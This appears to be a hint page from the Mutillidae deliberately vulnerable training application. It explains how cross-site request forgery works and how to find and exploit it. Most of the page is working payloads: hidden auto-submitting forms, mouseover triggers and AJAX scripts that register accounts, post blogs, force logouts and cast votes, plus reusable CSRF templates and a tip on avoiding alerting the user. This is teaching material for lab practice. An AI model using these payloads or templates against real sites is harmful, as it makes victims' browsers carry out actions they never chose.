			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			Cross site request forgery may occcur when an attacker is able to run script
			into a users browser. To forge a legitimate request, the script creates and
			send the same parameters to the target website that would be sent if the user
			had submitted the legitimate form themselves. The target website knows the
			request has come from the users browser but cannot detect that the request was
			created and sent by a malicious script running in the users browser. As far as
			the target site can tell, the user submitted the request by using the web site
			in the expected way.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>
			Check the target website forms for enbedded tokens which when sent along with the
			other parameters on the form make each request unique. The token could be a random
			string, some form of CAPTCHA, random math problem, or other way to "sign" each
			form in order to be able to identify the form later. If
			these tokens exists, they provide a method by which the target website can
			detect a forged request (which would not contain the token issued by the target
			web site). If the tokens are missing, the request is likely vulnerable to
			cross site request forgery.
			<br/><br/>
			<span class="report-header">Exploitation</span>
			<br/><br/>
			Submit the legitimate form and carefully note each parameter and value that
			must be sent for the server to process the request successfully. Either
			generate HTML or create a JavaScript that will send the same parameters
			to the same target site when the user triggers the "sending event". Next
			create a "sending event" which will cause the users browser to run the HTML
			or JavaScript that will send the request. The "sending event" can be as simple
			as a hidden form that is submitted when the user visits a page (onload), hovers
			over a particular object (onmouseover), or click on a certain area (onclick).
			The method used is not important as long as the parameters needed by the target
			site are submitted.
			<br/><br/>
			Note: If the target site requires authentication, the
			submission will only be successful if the user is still logged into the target
			site. There is no need they actually being viewing the site. They just need
			have a valid session token. The browser will send the session token
			automatically.
			<br/><br/>
			<span class="report-header">Examples</span>
			<br/><br/>
			Virtually all pages are vulnerable although not all pages contain transactions
			and not all transactions are sensitive. Possibilities include adding a blog
			entry for the current user without them having to visit
			the &quot;Add Blog&quot; page or registering a new account of your choice by having
			the user visit an infected page.
			<br/><br/>
			Lets assume that adding a new user account to Mutillidae is a sensitive transaction.
			Using the registration process as an example, start by capturing a request. One way
			to capture a request is by using the Burp interception proxy. This tool is preloaded
			if using the Samurai Web Testing Framework or Backtrack. Register a new user account
			with Burp running and interception enabled.
			<br/><br/>
			Here is a sample request captured using Burp on Samurai:
			<br/><br/>
<code>
<span class="important-code">POST /index.php?page=register.php</span> HTTP/1.1

Host: mutillidae
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.11) Gecko/20101013 Ubuntu/9.04 (jaunty) Firefox/3.6.11
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Proxy-Connection: keep-alive
Referer: http://mutillidae/index.php?page=register.php
Cookie: PHPSESSID=1a28b85b825be0e5c9dc2789c63a3b44
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
<span class="important-code">
username=username1&amp;;password=pass1&amp;confirm_password=pass1&amp;my_signature=signature1&amp;register-php-submit-button=Create+Account
</span>
</code>
			<br/>
			Note the method, action, and input parameters. Use the CSRF template to create an HTML form injection
			that can send this request. Here is an example to create a user "sammy" with password "samurai".
			<br/>
<code>
&lt;!--/*
Be careful to escape single-quotes if inserting into MySQL.
This example has the single quotes MySQL escaped (&#39; -&gt; \&#39;).
The try/catch is just to help you debug. This is not intended
to be used when pen testing because if the exploit fails the user
is going to be notified.
*/--&gt;
&lt;form id=&quot;CSRF&quot; method=&quot;POST&quot; action=&quot;/index.php?page=register.php&quot;&gt;
	&lt;input name=&quot;username&quot; 				value=&quot;sammy&quot; type=&quot;hidden&quot; /&gt;
	&lt;input name=&quot;password&quot; 				value=&quot;samurai&quot; type=&quot;hidden&quot; /&gt;
	&lt;input name=&quot;confirm_password&quot; 			value=&quot;samurai&quot; type=&quot;hidden&quot; /&gt;
	&lt;input name=&quot;my_signature&quot; 				value=&quot;The password is samurai&quot; type=&quot;hidden&quot; /&gt;
	&lt;input name=&quot;register-php-submit-button&quot; 	value=&quot;Create+Account&quot; type=&quot;hidden&quot; /&gt;
&lt;/form&gt;
&lt;span onmouseover=&quot;try{var lURL=document.location.href;document.getElementById(\&#39;CSRF\&#39;).submit();document.location.href=lURL;}catch(e){alert(e.message);}&quot;&gt;Hello World&lt;/span&gt;
</code>
			<br/>
			On the Add to your Blog page (http://mutillidae/index.php?page=add-to-your-blog.php),
			inject this exploit as a new blog. On either the Add Blog or the View Blog page, carefully
			mouseover the blog text and watch for the page to reload. Try to log in with the new user. Trap requests with an
			interception proxy like Burp to watch the actual request. Submit the request with XHR to get rid
			of that pesky page reload which could alert the user. When using XHR, use an interception
			proxy to watch the request and the response. Otherwise you wont notice.
			<br/><br/>
			<span class="report-header">Example: Force someone to add a blog - HTML Event Injection</span>
			<br/><br/>
<code>
&lt;form id=&quot;f&quot; action=&quot;index.php?page=add-to-your-blog.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;csrf-token&quot; value=&quot;best-guess&quot;/&gt;
&lt;input type=&quot;hidden&quot; name=&quot;blog_entry&quot; value=&quot;Add this guy to the Wall of Sheep&quot;/&gt;
&lt;input type=&quot;hidden&quot; name=&quot;add-to-your-blog-php-submit-button&quot; value=&quot;TESTING&quot;/&gt;
&lt;/form&gt;
&lt;i onmouseover=&quot;window.document.getElementById(\&#39;f\&#39;).submit()&quot;&gt;Dancing with the stars results&lt;/i&gt;
</code>
			<br/><br/>
			<span class="report-header">Example: Force someone to log out - HTML Event Injection</span>
    		<br/><br/>
<code>
&lt;i onmouseover=&quot;window.document.location=\&#39;http://localhost/mutillidae/index.php?do=logout\&#39;&quot;&gt;How to improve your Facebook status&lt;/i&gt;
</code>
			<br/><br/>
			<span class="report-header">Example: Force someone to add a blog - HTML injection</span>
    		<br/><br/>
<code>
&lt;script&gt;
	var f = document.createElement(&quot;form&quot;);
	f.method = &quot;POST&quot;;
	f.action = &quot;./index.php?page=add-to-your-blog.php&quot;;
	document.body.appendChild(f);

	var e = document.createElement(&quot;input&quot;);
	e.setAttribute(&quot;type&quot;, &quot;hidden&quot;);
	e.setAttribute(&quot;name&quot;, &quot;csrf-token&quot;);
	e.setAttribute(&quot;value&quot;, &quot;SecurityIsDisabled&quot;);
	f.appendChild(e);

	var e = document.createElement(&quot;input&quot;);
	e.setAttribute(&quot;type&quot;, &quot;hidden&quot;);
	e.setAttribute(&quot;name&quot;, &quot;blog_entry&quot;);
	e.setAttribute(&quot;value&quot;, &quot;this is an auto message!&quot;);
	f.appendChild(e);

	var e = document.createElement(&quot;input&quot;);
	e.setAttribute(&quot;type&quot;, &quot;hidden&quot;);
	e.setAttribute(&quot;name&quot;, &quot;add-to-your-blog-php-submit-button&quot;);
	e.setAttribute(&quot;value&quot;, &quot;Save Blog Entry&quot;);
	f.appendChild(e);

	f.submit();
&lt;/script&gt;
</code>
			<br/><br/>
			<span class="report-header">Example: Force someone to add a blog - AJAX</span>
    		<br/><br/>
<code>
&lt;script&gt;
	var lXMLHTTP;
	try{
		var lBlogEntry = encodeURI(&quot;BLOG_ENTRY_GOES_HERE&quot;);

		var lData = &quot;csrf-token=&amp;blog_entry=&quot;+lBlogEntry+&quot;&amp;add-to-your-blog-php-submit-button=Save+Blog+Entry&quot;;
		var lAction = &quot;./index.php?page=add-to-your-blog.php&quot;;
		var lMethod = &quot;POST&quot;;

		try {
			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
		}catch(e){
			try {
				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
			}catch(e){
				try{
					lXMLHTTP = new XMLHttpRequest();
				}catch(e){
					alert(e.message);
				}
			}
		}

		lXMLHTTP.onreadystatechange = function(){
			if(lXMLHTTP.readyState == 4){
				alert(&quot;CSRF Complete&quot;);
			}
		};

		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
		lXMLHTTP.send(lData);
	}catch(e){
		alert(e.message);
	}
&lt;/script&gt;
</code>
			<br/><br/>
			<span class="report-header">Example: Force someone to register an account - AJAX</span>
    		<br/><br/>
<code>
&lt;script&gt;
	var lXMLHTTP;
	try{
		var lUsername = &quot;&lt;USERNAME GOES HERE&gt;&quot;;
		var lPassword = &quot;&lt;PASSWORD GOES HERE&gt;&quot;;
		var lSignature = &quot;&lt;SIGNATURE GOES HERE&gt;&quot;;
		var lData = &quot;username=&quot;+lUsername+&quot;&amp;password=&quot;+lPassword+&quot;&amp;confirm_password=&quot;+lPassword+&quot;&amp;my_signature=&quot;+lSignature+&quot;&amp;register-php-submit-button=Create+Account&quot;;
		var lAction = &quot;./index.php?page=register.php&quot;;
		var lMethod = &quot;POST&quot;;

		try {
			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
		}catch(e){
			try {
				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
			}catch(e){
				try{
					lXMLHTTP = new XMLHttpRequest();
				}catch(e){
					alert(e.message);
				}
			}
		}

		lXMLHTTP.onreadystatechange = function(){
			if(lXMLHTTP.readyState == 4){
				alert(&quot;CSRF Complete&quot;);
			}
		};

		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
		lXMLHTTP.send(lData);
	}catch(e){
		alert(e.message);
	}
&lt;/script&gt;
</code>
			<br/><br/>
			<span class="report-header">Example: Force someone to vote for NMap - HTML injection</span>
    		<br/><br/>
<code>
&lt;script&gt;
function sendcsrf(){
	var lForm = document.createElement("FORM");
	lForm.action="http://mutillidae/index.php";
	lForm.method = "GET";
	lForm.enctype="application/x-www-form-urlencoded";
	document.body.appendChild(lForm);

	var lPage = document.createElement("INPUT");
	lPage.setAttribute("name", "page");
	lPage.setAttribute("type", "hidden");
	lPage.setAttribute("value", "user-poll.php");
	lForm.appendChild(lPage);

	var lCSRFToken = document.createElement("INPUT");
	lCSRFToken.setAttribute("name", "csrf-token");
	lCSRFToken.setAttribute("type", "hidden");
	lCSRFToken.setAttribute("value", "");
	lForm.appendChild(lCSRFToken);
	var lChoice = document.createElement("INPUT");
	lChoice.setAttribute("name", "choice");
	lChoice.setAttribute("type", "hidden");
	lChoice.setAttribute("value", "nmap");
	lForm.appendChild(lChoice);

	var lInitials = document.createElement("INPUT");
	lInitials.setAttribute("name", "initials");
	lInitials.setAttribute("type", "hidden");
	lInitials.setAttribute("value", "JD");
	lForm.appendChild(lInitials);

	var lButton = document.createElement("INPUT");
	lButton.setAttribute("name", "user-poll-php-submit-button");
	lButton.setAttribute("type", "hidden");
	lButton.setAttribute("value", "Submit Vote");
	lForm.appendChild(lButton);

	lForm.submit();
}
&lt;/script&gt;
&lt;span onmouseover="sendcsrf();"&gt;Vote for nmap. I know you will.&lt;/span&gt;
</code>
			<br/><br/>
			<span class="report-header">Example: Force someone to vote for NMap - AJAX</span>
    		<br/><br/>
<code>
&lt;script&gt;
	var lXMLHTTP;
	try{
		var lData = &quot;&quot;;
		var lAction = &quot;./index.php?page=user-poll.php&amp;csrf-token=&amp;choice=nmap&amp;initials=CSRF&amp;user-poll-php-submit-button=Submit+Vote&quot;;

		var lMethod = &quot;GET&quot;;

		try {
			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
		}catch(e){
			try {
				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
			}catch(e){
				try{
					lXMLHTTP = new XMLHttpRequest();
				}catch(e){
					alert(e.message);
				}
			}
		}

		lXMLHTTP.onreadystatechange = function(){
			if(lXMLHTTP.readyState == 4){
				alert(&quot;CSRF Complete&quot;);
			}
		};

		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
		lXMLHTTP.send();
	}catch(e){
		alert(e.message);
	}
&lt;/script&gt;
</code>
<br/><br/>
<span class="report-header">Appendix - CSRF Template - HTML Form</span>
<br/><br/>
<code>
/* HTML Injection based CSRF template */
&lt;form id=&quot;CSRFForm&quot; method=&quot;$REQUEST-METHOD-HERE$&quot; action=&quot;$SUBMIT-ACTION-PAGE-HERE$&quot;&gt;

	$FOR-EACH-REQUEST-INPUT-PARAMETER$
	&lt;input type=&quot;hidden&quot; name=&quot;$PARAMETER-NAME$&quot; value=&quot;$PARAMETER-VALUE$&quot; /&gt;
	$END-FOR$
&lt;/form&gt;
/* Now choose an event which when triggered will submit the form. Here are some examples */
&lt;body onload=&#39;window.document.getElementById(&quot;CSRFForm&quot;).submit();&#39;&gt;
&lt;span onmouseover=&#39;window.document.getElementById(&quot;CSRFForm&quot;).submit();&#39;&gt;Hello World&lt;/span&gt;

/* JavaScript Injection based CSRF template */
/* NOTE: Script tags are only needed if injection is into HTML context.
If injecting into JavaScript context, do not include script tags. */
&lt;script&gt;
  	var lCSRFForm = window.document.createElement(&quot;form&quot;);
   	lCSRFForm.name=&quot;CSRFForm&quot;;
   	lCSRFForm.method=&quot;$REQUEST-METHOD-HERE$&quot;;
	lCSRFForm.action=&quot;$SUBMIT-ACTION-PAGE-HERE$&quot;
   	$FOR-EACH-REQUEST-INPUT-PARAMETER$
   		var lInput = document.createElement(&quot;input&quot;);
   		lInput.type=&quot;hidden&quot;;
   		lInput.name=&quot;$PARAMETER-NAME$&quot;;
   		lInput.value=&quot;$PARAMETER-VALUE$&quot;;
   		lCSRFForm.appendChild(lInput);
   	$END-FOR$
   	window.document.appendChild(lCSRFForm);
   	lCSRFForm.submit();
&lt;/script&gt;
</code>
<br/><br/>
<span class="report-header">Appendix - CSRF Template - AJAX</span>
<br/><br/>
<code>
&lt;script&gt;
	var lXMLHTTP;
	try{
		var lData = &quot;$THE-ENTIRE-POST-PARAMETER-STRING-COPIED-FROM-REQUEST-OR-TYPED-IN$&quot;;
		var lAction = &quot;$SUBMIT-ACTION-PAGE-HERE$&quot;;
		var lMethod = &quot;$REQUEST-METHOD-HERE$&quot;;
		try {
			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
		}catch (e) {
			try {
				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
			}catch (e) {
				try {
					lXMLHTTP = new XMLHttpRequest();
				}catch (e) {
					alert(e.message);
				}
			}
		}
		lXMLHTTP.onreadystatechange = function(){
			if(lXMLHTTP.readyState == 4){
				alert(&quot;CSRF Complete&quot;);
			}
		}
		/////////////////////////////
		//UNCOMMENT FOR GET REQUESTS
		/////////////////////////////
		//xmlhttp.open(lMethod, lAction, true);
		//lData=&quot;&quot;;
		/////////////////////////////

		/////////////////////////////
		//UNCOMMENT FOR POST REQUESTS
		/////////////////////////////
		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader(&quot;Method&quot;, &quot;POST &quot; + lAction + &quot; HTTP/1.1&quot;);
		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
		lXMLHTTP.send(lData);
	}catch(e){
		alert(e.message);
	}
&lt;/script&gt;
</code>
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisCrossSiteRequestForgeryCSRF);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowCrosssiteRequestForgeryCSRFTokensWork);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CookiesPart3HowSameSiteWorks);?>
<br/><br/>
